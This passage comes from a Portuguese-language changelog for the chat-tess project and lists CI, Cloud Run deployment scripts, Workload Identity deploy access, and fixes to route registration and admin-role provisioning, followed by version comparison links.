  na inicialização e roda como usuário sem privilégios.
- Integração contínua no GitHub Actions: formatação, lint, tipos, testes com cobertura, build e
  testes ponta a ponta com Postgres.
- README com instruções de execução, comandos e guia de leitura da arquitetura.
- Script `infra/provision.sh` para provisionar Cloud SQL, Secret Manager, bucket e conta de serviço
  e fazer o deploy no Cloud Run.
- `infra/setup-github-deploy.sh`: dá ao GitHub Actions acesso de deploy por Workload Identity
  Federation, sem chave de service account, restrito a este repositório e a este serviço.
- Deploy contínuo: push na `main` publica uma revisão no Cloud Run depois que lint, testes e e2e
  passam, e confere o health check da revisão nova.

### Changed

- `infra/provision.sh` usa o projeto ativo no `gcloud`, cria os segredos da sessão e do OAuth,
  concede a permissão de build exigida em projetos novos e já conhece a URL do serviço antes do
  primeiro deploy.

### Fixed

- Rotas de configuração de tools (`/api/tools`) montadas na aplicação; o commit que as adicionou
  não as registrou no composition root.
- `infra/provision.sh` passa `ADMIN_EMAILS` ao Cloud Run; antes, rodar o script de novo removia
  o papel de administrador em produção.

[Unreleased]: https://github.com/kenjimattos/chat-tess/compare/v0.3.1...HEAD
[0.3.1]: https://github.com/kenjimattos/chat-tess/compare/v0.3.0...v0.3.1
[0.3.0]: https://github.com/kenjimattos/chat-tess/compare/v0.2.0...v0.3.0
[0.2.0]: https://github.com/kenjimattos/chat-tess/compare/v0.1.0...v0.2.0
[0.1.0]: https://github.com/kenjimattos/chat-tess/releases/tag/v0.1.0
